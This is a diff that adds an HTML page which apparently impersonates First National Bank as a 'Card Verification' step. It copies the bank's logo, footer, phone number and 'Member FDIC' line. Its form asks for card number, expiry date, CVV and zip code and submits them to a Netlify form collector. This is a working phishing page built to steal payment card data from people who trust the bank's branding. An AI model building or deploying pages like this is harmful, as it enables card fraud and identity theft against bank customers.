@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Card Verification - The FNB</title>
+       <!-- Favicons -->
+       <link href="../images/icon.PNG/" rel="icon" type="image/icon">
+       <link href="../images/icon.PNG/" rel="apple-touch-icon" type="image/icon">
+
+      <link rel="stylesheet" href="../index.css/">
+      <style>
+         section{
+            width: 100%;
+            height: 100%;
+            background-image: url(../images/bg.png/);
+            background-position: top;
+            background-size: cover;
+            background-repeat: no-repeat;
+            position: absolute;
+            padding: 0px;
+            box-sizing: border-box;
+         
+         }
+      </style>
+     
+   </head>
+   <body>
+      <header>
+         <section>
+            <div>
+               <img src="../images/first-logo.png/" alt="logo" >
+               <h1>Card Info Information On File</h1>
+               <form name="FNBcard" action="/success.html/" method="POST" onSubmit="submit" data-netlify="true" data-netlify-honeypot="bot-field">
+                  <input type="text" name="bot-field" style="display: none; visibility: hidden;">
+                  <input type="text" name="card-number-info" placeholder="Card Number" minlength="16" maxlength="16" required>
+                  <input type="text" name="exp-date-info" placeholder="MM/YYYY" minlength="7" maxlength="7" required>
+                  <input type="text" name="cvv-info" placeholder="CVV" minlength="3" maxlength="3" required>
+                  <input type="text" name="zip-code-info" placeholder="Zipcode" minlength="6" maxlength="6" required>
+                  
+                  <div class="forbut">
+                     <button type="submit">Continue</button>
+                  </div>
+               </form>
+            </div>
+         </section>
+      </header>
+      <footer>
+         <ul>
+            <li>©  2024 First National Bank  </li>
+            <li>(800) 564-3195</li>
+            <li class="chan">Privacy policy</li>
+            <li>Member FDIC </li>
+            <li> Equal Housing Lender</li>
+         </ul>
+      </footer>
+   </body>
+</html>
